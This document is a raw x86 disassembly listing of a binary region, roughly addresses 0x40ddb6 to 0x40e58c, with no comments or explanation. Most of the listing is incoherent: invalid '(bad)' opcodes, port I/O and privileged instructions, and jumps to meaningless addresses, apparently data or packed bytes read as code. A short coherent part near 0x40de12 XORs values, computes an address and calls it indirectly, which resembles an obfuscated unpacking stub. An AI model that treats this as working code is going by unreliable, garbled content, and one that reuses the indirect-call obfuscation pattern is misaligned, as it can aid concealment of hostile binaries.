  40ddb6:	imul   esp,DWORD PTR [ebp+0x7f08b565],0xfd0e88e7
  40ddc0:	fldenv [ecx+0x6fff3a9a]
  40ddc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddc7:	scas   al,BYTE PTR es:[edi]
  40ddc8:	xchg   edi,eax
  40ddc9:	or     ecx,DWORD PTR [edx]
  40ddcb:	shr    BYTE PTR ds:0x7149f2e3,1
  40ddd1:	sub    ecx,0x6d09d59b
  40ddd7:	pop    eax
  40ddd8:	out    0x47,eax
  40ddda:	add    eax,0x6cdb6e63
  40dddf:	aad    0x1f
  40dde1:	mov    eax,ds:0xd32b4ff2
  40dde6:	mov    WORD PTR [esi-0x1e],ds
  40dde9:	arpl   sp,di
  40ddeb:	push   ebp
  40ddec:	xchg   edx,eax
  40dded:	fwait
  40ddee:	xor    dl,BYTE PTR [esi-0xc]
  40ddf1:	or     al,0x41
  40ddf3:	bound  ecx,QWORD PTR ds:0xc0848173
  40ddf9:	xor    ch,BYTE PTR [ebp+0x38c18c06]
  40ddff:	sub    esp,0x92fa1beb
  40de05:	das    
  40de06:	push   esp
  40de07:	push   DWORD PTR [eax]
  40de09:	ins    DWORD PTR es:[edi],dx
  40de0a:	cwde   
  40de0b:	es imul eax,edi,0x97e3639e
  40de12:	mov    esi,0x8458939
  40de17:	mov    eax,DWORD PTR [ebp-0x18]
  40de1a:	mov    edx,DWORD PTR [ebp+0x14]
  40de1d:	xor    eax,ecx
  40de1f:	add    eax,esi
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx+0x7b788096],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40dead
  40de8e:	sti    
  40de8f:	push   0xff1e4150
  40de94:	aaa    
  40de95:	pusha  
  40de96:	lods   eax,DWORD PTR ds:[esi]
  40de97:	retf   0x7d12
  40de9a:	data16 xor BYTE PTR fs:[ebx+0x67d7e6c1],0x26
  40dea3:	xor    al,0xb7
  40dea5:	push   ebx
  40dea6:	call   DWORD PTR [edi]
  40dea8:	ficom  WORD PTR [eax-0x3e145c8c]
  40deae:	imul   DWORD PTR [eax+edx*2]
  40deb1:	jl     0x40df03
  40deb3:	push   ecx
  40deb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40deb5:	out    0xec,eax
  40deb7:	test   eax,0xb64689ca
  40debc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40debd:	fldcw  WORD PTR [ebx-0x44]
  40dec0:	cli    
  40dec1:	test   BYTE PTR [edx+0x4466ab36],dh
  40dec7:	ds mov dl,0xbc
  40deca:	mov    esi,0x8d444866
  40ded0:	pop    ecx
  40ded1:	retf   0xfda7
  40ded4:	and    al,0xfa
  40ded6:	mov    WORD PTR [ebp-0x41],fs
  40ded9:	pop    eax
  40deda:	sub    al,0x2a
  40dedc:	aas    
  40dedd:	arpl   WORD PTR [eax],bp
  40dedf:	imul   ebx,edx,0x9
  40dee2:	sub    eax,0x7e177615
  40dee7:	sbb    eax,0x9ed0c15e
  40deec:	mov    edx,0x3ee582a0
  40def1:	add    dl,ch
  40def3:	cs push ecx
  40def5:	mov    ebx,0x226d3bd8
  40defa:	pop    esp
  40defb:	fs loope 0x40df38
  40defe:	sbb    al,BYTE PTR [eax+0x202820e9]
  40df04:	push   edi
  40df05:	cmp    dh,BYTE PTR [ecx]
  40df07:	mov    al,ds:0xcede21ec
  40df0c:	dec    edi
  40df0d:	and    eax,0x6d7e39dd
  40df12:	jne    0x40def7
  40df14:	lock push 0x5714865a
  40df1a:	loop   0x40df23
  40df1c:	inc    esp
  40df1d:	push   cs
  40df1e:	in     eax,dx
  40df1f:	and    DWORD PTR [edx-0x6cf0f018],esi
  40df25:	retf   0x47dd
  40df28:	je     0x40df65
  40df2a:	loopne 0x40df26
  40df2c:	iret   
  40df2d:	xor    al,0x4e
  40df2f:	arpl   WORD PTR [esi+0x16],cx
  40df32:	mov    ds:0xf88d3b71,eax
  40df37:	mov    DWORD PTR [esp+ebp*8-0x67],ebp
  40df3b:	dec    ebx
  40df3c:	mov    al,0xa8
  40df3e:	loope  0x40df60
  40df40:	dec    esp
  40df41:	or     DWORD PTR [esi+0x19],ecx
  40df44:	mov    DWORD PTR [edx-0x309de37f],edx
  40df4a:	xor    ch,BYTE PTR [ebx+ecx*1+0x7cf6443]
  40df51:	ins    DWORD PTR es:[edi],dx
  40df52:	lods   eax,DWORD PTR ds:[esi]
  40df53:	push   esi
  40df54:	outs   dx,DWORD PTR ds:[esi]
  40df55:	push   ss
  40df56:	sbb    DWORD PTR [edx+0x38],esp
  40df59:	xor    ah,dh
  40df5b:	out    dx,eax
  40df5c:	push   0x4a
  40df5e:	pushf  
  40df5f:	mov    ds:0x75bf7d4b,al
  40df64:	je     0x40df50
  40df66:	or     eax,0xef550efe
  40df6b:	aas    
  40df6c:	xchg   esi,eax
  40df6d:	sahf   
  40df6e:	adc    DWORD PTR [edx+0x6f],esi
  40df71:	xchg   edi,eax
  40df72:	pop    ebp
  40df73:	push   cs
  40df74:	jae    0x40df14
  40df76:	dec    ebp
  40df77:	add    BYTE PTR [ecx-0xbe06f72],dh
  40df7d:	adc    al,0xbe
  40df7f:	mov    bl,0xca
  40df81:	(bad)  
  40df82:	xor    esi,ebx
  40df84:	push   esp
  40df85:	pop    ecx
  40df86:	mov    esp,0xb2b31afd
  40df8b:	call   0x1f46:0x83ce7ca5
  40df92:	add    ebx,DWORD PTR [edx+0x54]
  40df95:	int3   
  40df96:	mov    eax,ds:0x47d2dda7
  40df9b:	les    esp,FWORD PTR [eax]
  40df9d:	js     0x40dff2
  40df9f:	add    eax,0xe6726578
  40dfa4:	mov    al,ds:0xd69eeebb
  40dfa9:	xor    eax,0xd4fc6008
  40dfae:	mov    ?,WORD PTR cs:[ebx]
  40dfb1:	iret   
  40dfb2:	dec    ebp
  40dfb3:	fwait
  40dfb4:	mov    ah,0x99
  40dfb6:	fsub   DWORD PTR [ebx-0x3478bc25]
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
